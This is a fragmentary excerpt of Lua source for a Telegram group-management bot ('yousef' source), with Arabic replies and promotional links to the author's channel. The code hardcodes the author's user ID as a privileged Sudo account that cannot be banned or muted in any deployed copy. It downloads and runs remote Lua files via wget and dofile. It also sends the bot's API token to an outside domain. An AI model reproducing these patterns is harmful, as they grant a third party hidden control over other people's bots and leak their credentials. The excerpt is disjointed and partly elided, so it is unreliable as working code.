...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,67993004,67993004}
...
if tonumber(user_id) == tonumber(67993004) then  
var = true  
elseif tonumber(user_id) == tonumber(67993004) then
var = true  
...
local UserName = (data.username_ or "Aisha_son")
...
if result.id_ == tonumber(67993004) then
...
if userid == tonumber(67993004) then
send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(67993004) then
...
send(msg.chat_id_, msg.id_,"\n• العضو ↺ ["..data.first_name_.."](t.me/"..(data.username_ or "Aisha_son")..")".."\n• تم رفعه "..RTPA.." هنا\n")
...
if yousefrt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"\n• العضو ↺ ["..result.title_.."](t.me/"..(text1[3] or "Aisha_son")..")".."\n• تم رفعه "..text1[2].." هنا")   
database:sadd(bot_id.."yousef:Special:User"..msg.chat_id_,result.id_)  
...
function Function_yousef(extra, result, success)
if result.sender_user_id_ == tonumber(67993004) then
send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(679930041100) then
send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
local UserName = (b.username_ or "Aisha_son")
...
os.execute('wget https://raw.githubusercontent.com/aishason/yousef/master/yousef.lua')
os.execute('wget https://raw.githubusercontent.com/aishason/yousef/master/start.lua')
dofile('yousef.lua')  
return false
end
if text == "راسلني" then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '- yousef Team .',url="t.me/Aisha_son "}},
}
local msg_id = msg.id_/2097152/0.5
...
Srrt = https.request('https://yousef-source.tk/Aisha_son/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
local Text =[[
𝙬𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙨𝙤𝙪𝙧𝙘𝙚 [𝙮𝙤𝙪𝙨𝙚𝙛 𝙡𝙖𝙗𝙗𝙖𝙣](t.me/Aisha_son)
...
inline = {
{{text = '• yousef 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/Aisha_son'}},
}
...
>> The Bot is Running
>> Bot source > yousef
>>Source channel > @Aisha_son
>>Source developer > @Aisha_son
╔═╦╗──────╔═╗───╔═╗  ╔╗─────╔╗─╔╗─────────
╚╗║║╔═╗╔╦╗║═╣╔═╗║═╣  ║║─╔═╗─║╚╗║╚╗╔═╗─╔═╦╗
╔╩╗║║╬║║║║╠═║║╩╣║╔╝  ║╚╗║╬╚╗║╬║║╬║║╬╚╗║║║║
╚══╝╚═╝╚═╝╚═╝╚═╝╚╝─  ╚═╝╚══╝╚═╝╚═╝╚══╝╚╩═╝
